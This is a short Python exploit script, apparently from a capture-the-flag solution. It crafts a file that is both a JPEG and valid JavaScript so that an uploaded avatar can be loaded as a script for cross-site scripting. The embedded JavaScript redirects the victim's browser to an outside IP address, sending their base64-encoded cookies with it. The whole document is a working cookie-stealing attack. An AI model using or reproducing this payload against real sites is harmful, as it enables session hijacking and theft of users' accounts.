signature = b'\xFF\xD8\xFF\xE0'
length = b'\x2F\x2A' # length of the next block and also "/*" at the same time
EXIF = b'\x45\x78\x69\x66'
padding = b'\x20' * 12068 # file[4+length] need to be '\xFF'
block = b'\xFF\xC0\x20\x20\x20'
size = b'\x30\x30\x30\x30' # Width
end = b'*/=' # End the comment block
js_code = b'document.location="http://178.62.102.205:8000/"+btoa(document.cookie);'
payload = signature + length + EXIF + padding + block + size + end + js_code
# XSS Payload <script src="/api/avatar/{YOUR_USER}" charset="ISO-8859-1"></script>..
open('./exp.jpg', 'wb').write(payload)
